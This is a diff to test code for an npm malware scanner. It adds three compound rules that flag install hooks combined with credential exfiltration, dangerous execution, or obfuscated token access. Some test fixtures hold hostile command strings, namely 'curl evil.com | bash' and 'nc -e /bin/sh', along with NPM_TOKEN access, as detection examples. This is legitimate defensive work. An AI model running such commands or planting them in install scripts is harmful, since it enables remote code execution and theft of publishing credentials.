@@ -336,26 +336,27 @@ async function runCompoundScoringTests() {
   // ===================================================================
   // Rules and playbooks exist for all 4 active compound types
   // ===================================================================
-  test('Rules: all 5 active compound rules exist with correct IDs', () => {
+  test('Rules: all 8 active compound rules exist with correct IDs', () => {
     const compoundTypes = [
       'crypto_staged_payload', 'lifecycle_typosquat',
       'lifecycle_inline_exec', 'lifecycle_remote_require',
-      'websocket_credential_exfil'
+      'websocket_credential_exfil',
+      'lifecycle_dataflow', 'lifecycle_dangerous_exec', 'obfuscated_lifecycle_env'
     ];
     for (const type of compoundTypes) {
       const rule = getRule(type);
       assert(rule.id !== 'MUADDIB-UNK-001', `Rule for ${type} should exist, got unknown`);
       assert(rule.id.startsWith('MUADDIB-COMPOUND-'), `Rule ID for ${type} should start with MUADDIB-COMPOUND-, got ${rule.id}`);
-      assert(rule.severity === 'CRITICAL', `Rule severity for ${type} should be CRITICAL, got ${rule.severity}`);
       assert(rule.confidence === 'high', `Rule confidence for ${type} should be high, got ${rule.confidence}`);
     }
   });
 
-  test('Playbooks: all 5 active compound playbooks exist', () => {
+  test('Playbooks: all 8 active compound playbooks exist', () => {
     const compoundTypes = [
       'crypto_staged_payload', 'lifecycle_typosquat',
       'lifecycle_inline_exec', 'lifecycle_remote_require',
-      'websocket_credential_exfil'
+      'websocket_credential_exfil',
+      'lifecycle_dataflow', 'lifecycle_dangerous_exec', 'obfuscated_lifecycle_env'
     ];
     for (const type of compoundTypes) {
       const playbook = getPlaybook(type);
@@ -733,6 +734,125 @@ async function runCompoundScoringTests() {
     applyFPReductions(threats);
     assert(threats[0].severity === 'LOW',
       `electron-rebuild lifecycle should be LOW, got ${threats[0].severity}`);
+  });
+
+  // ===================================================================
+  // C3: New compound scoring rules (post-audit fondamental)
+  // ===================================================================
+  console.log('\n  --- C3: New Compound Rules ---\n');
+
+  // --- lifecycle_dataflow ---
+  test('C3: lifecycle_dataflow — positive (lifecycle + suspicious_dataflow)', () => {
+    const threats = [
+      { type: 'lifecycle_script', severity: 'MEDIUM', file: 'package.json', message: 'preinstall: node setup.js' },
+      { type: 'suspicious_dataflow', severity: 'HIGH', file: 'setup.js', message: 'credential read → network send' }
+    ];
+    applyCompoundBoosts(threats);
+    const compound = threats.find(t => t.type === 'lifecycle_dataflow');
+    assert(compound, 'lifecycle_dataflow compound should fire');
+    assert(compound.severity === 'HIGH', `Should be HIGH, got ${compound.severity}`);
+    assert(compound.compound === true, 'Should have compound flag');
+    assert(compound.file === 'setup.js', `File should come from suspicious_dataflow`);
+  });
+
+  test('C3: lifecycle_dataflow — negative (only lifecycle_script)', () => {
+    const threats = [
+      { type: 'lifecycle_script', severity: 'MEDIUM', file: 'package.json', message: 'preinstall' }
+    ];
+    applyCompoundBoosts(threats);
+    assert(!threats.find(t => t.type === 'lifecycle_dataflow'), 'Should NOT fire with only lifecycle');
+  });
+
+  test('C3: lifecycle_dataflow — negative (only suspicious_dataflow)', () => {
+    const threats = [
+      { type: 'suspicious_dataflow', severity: 'HIGH', file: 'lib.js', message: 'flow' }
+    ];
+    applyCompoundBoosts(threats);
+    assert(!threats.find(t => t.type === 'lifecycle_dataflow'), 'Should NOT fire with only dataflow');
+  });
+
+  test('C3: lifecycle_dataflow — severity gate (all LOW)', () => {
+    const threats = [
+      { type: 'lifecycle_script', severity: 'LOW', file: 'package.json', message: 'node-gyp rebuild' },
+      { type: 'suspicious_dataflow', severity: 'LOW', file: 'lib.js', message: 'flow' }
+    ];
+    applyCompoundBoosts(threats);
+    assert(!threats.find(t => t.type === 'lifecycle_dataflow'), 'Should NOT fire when all LOW');
+  });
+
+  // --- lifecycle_dangerous_exec ---
+  test('C3: lifecycle_dangerous_exec — positive (lifecycle + dangerous_exec)', () => {
+    const threats = [
+      { type: 'lifecycle_script', severity: 'MEDIUM', file: 'package.json', message: 'postinstall: node install.js' },
+      { type: 'dangerous_exec', severity: 'CRITICAL', file: 'install.js', message: 'curl evil.com | bash' }
+    ];
+    applyCompoundBoosts(threats);
+    const compound = threats.find(t => t.type === 'lifecycle_dangerous_exec');
+    assert(compound, 'lifecycle_dangerous_exec compound should fire');
+    assert(compound.severity === 'CRITICAL', `Should be CRITICAL, got ${compound.severity}`);
+    assert(compound.file === 'install.js', `File should come from dangerous_exec`);
+  });
+
+  test('C3: lifecycle_dangerous_exec — negative (only dangerous_exec)', () => {
+    const threats = [
+      { type: 'dangerous_exec', severity: 'CRITICAL', file: 'run.js', message: 'nc -e /bin/sh' }
+    ];
+    applyCompoundBoosts(threats);
+    assert(!threats.find(t => t.type === 'lifecycle_dangerous_exec'), 'Should NOT fire without lifecycle');
+  });
+
+  test('C3: lifecycle_dangerous_exec — severity gate (all LOW)', () => {
+    const threats = [
+      { type: 'lifecycle_script', severity: 'LOW', file: 'package.json', message: 'husky install' },
+      { type: 'dangerous_exec', severity: 'LOW', file: 'x.js', message: 'exec' }
+    ];
+    applyCompoundBoosts(threats);
+    assert(!threats.find(t => t.type === 'lifecycle_dangerous_exec'), 'Should NOT fire when all LOW');
+  });
+
+  // --- obfuscated_lifecycle_env ---
+  test('C3: obfuscated_lifecycle_env — positive (same file for obf + env)', () => {
+    const threats = [
+      { type: 'obfuscation_detected', severity: 'HIGH', file: 'setup.js', message: 'obfuscated code' },
+      { type: 'env_access', severity: 'HIGH', file: 'setup.js', message: 'NPM_TOKEN' },
+      { type: 'lifecycle_script', severity: 'MEDIUM', file: 'package.json', message: 'preinstall: node setup.js' }
+    ];
+    applyCompoundBoosts(threats);
+    const compound = threats.find(t => t.type === 'obfuscated_lifecycle_env');
+    assert(compound, 'obfuscated_lifecycle_env compound should fire');
+    assert(compound.severity === 'HIGH', `Should be HIGH, got ${compound.severity}`);
+  });
+
+  test('C3: obfuscated_lifecycle_env — negative (obf + env in different files)', () => {
+    const threats = [
+      { type: 'obfuscation_detected', severity: 'HIGH', file: 'lib/crypto.js', message: 'obfuscated' },
+      { type: 'env_access', severity: 'HIGH', file: 'config/env.js', message: 'NPM_TOKEN' },
+      { type: 'lifecycle_script', severity: 'MEDIUM', file: 'package.json', message: 'preinstall' }
+    ];
+    applyCompoundBoosts(threats);
+    assert(!threats.find(t => t.type === 'obfuscated_lifecycle_env'),
+      'Should NOT fire when obf + env in different files (sameFile constraint)');
+  });
+
+  test('C3: obfuscated_lifecycle_env — negative (no lifecycle)', () => {
+    const threats = [
+      { type: 'obfuscation_detected', severity: 'HIGH', file: 'x.js', message: 'obfuscated' },
+      { type: 'env_access', severity: 'HIGH', file: 'x.js', message: 'NPM_TOKEN' }
+    ];
+    applyCompoundBoosts(threats);
+    assert(!threats.find(t => t.type === 'obfuscated_lifecycle_env'), 'Should NOT fire without lifecycle');
+  });
+
+  test('C3: obfuscated_lifecycle_env — no duplicate', () => {
+    const threats = [
+      { type: 'obfuscation_detected', severity: 'HIGH', file: 'x.js', message: 'obf' },
+      { type: 'env_access', severity: 'HIGH', file: 'x.js', message: 'NPM_TOKEN' },
+      { type: 'lifecycle_script', severity: 'MEDIUM', file: 'package.json', message: 'preinstall' },
+      { type: 'obfuscated_lifecycle_env', severity: 'HIGH', file: 'x.js', message: 'already' }
+    ];
+    applyCompoundBoosts(threats);
+    const compounds = threats.filter(t => t.type === 'obfuscated_lifecycle_env');
+    assert(compounds.length === 1, `Should not duplicate, got ${compounds.length}`);
   });
 }
 
